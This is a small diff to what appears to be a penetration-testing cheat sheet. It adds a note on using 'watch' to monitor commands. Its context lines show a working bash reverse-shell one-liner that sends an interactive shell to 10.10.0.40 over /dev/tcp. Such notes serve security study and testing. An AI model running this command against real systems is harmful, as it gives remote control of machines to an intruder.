@@ -238,7 +238,8 @@ Reverse shell with nc and /dev/tcp
     On Victim:
     $ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
 
-
+to view a commands being ran
+  watch -n1 'command'
 
 
 
